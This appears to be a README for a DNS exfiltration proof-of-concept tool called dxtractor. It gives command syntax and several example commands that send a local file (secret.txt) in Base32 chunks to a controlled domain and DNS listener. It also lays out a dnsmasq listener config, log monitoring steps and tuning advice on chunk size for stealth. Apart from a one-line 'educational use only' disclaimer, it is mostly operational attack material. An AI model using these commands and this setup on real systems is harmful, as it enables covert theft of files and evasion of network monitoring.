# dxtractor

---

## Overview

dxtractor is a cross-platform DNS exfiltration PoC using Base32 encoding.

Supports:

* Linux
* Windows
* macOS

---

## Usage

```
dxtractor <file> <domain> <dns_server> [-p port] [-d delay] [-c chunk]
```

---

## Parameters

| Flag       | Description                        |
| ---------- | ---------------------------------- |
| file       | File to exfiltrate                 |
| domain     | Controlled domain                  |
| dns_server | DNS server IP                      |
| -p         | Port (default: 5353)               |
| -d         | Delay (seconds)                    |
| -c         | Chunk size (multiple of 8, max 56) |

---

## Examples

```
dxtractor secret.txt dnstest.test 10.10.10.10
dxtractor secret.txt dnstest.test 10.10.10.10 -d 1
dxtractor secret.txt dnstest.test 10.10.10.10 -c 32
dxtractor secret.txt dnstest.test 10.10.10.10 -p 53 -d 1 -c 24
```

---

## dnsmasq Setup

Example config:

```
port=5353
log-queries
log-facility=/var/log/dnsmasq.log

listen-address=<DNS_SERVER_IP>
bind-interfaces

interface=<INTERFACE>
except-interface=lo

address=/dnstest.test/<DNS_SERVER_IP>
```

---

## Replace

| Field             | Value             |
| ----------------- | ----------------- |
| `<DNS_SERVER_IP>` | your listener     |
| `<INTERFACE>`     | network interface |

---

## Start dnsmasq

```
sudo systemctl restart dnsmasq
```

---

## Monitor

```
sudo tail -f /var/log/dnsmasq.log
```

---

## Parser

Parser remains unchanged.

---

## Notes

* Base32 avoids DNS case issues
* Chunk must be ≤56 and multiple of 8
* Smaller chunks = stealth, slower
* Larger chunks = faster, noisier

---

## Disclaimer

Educational use only. Authorized environments only.
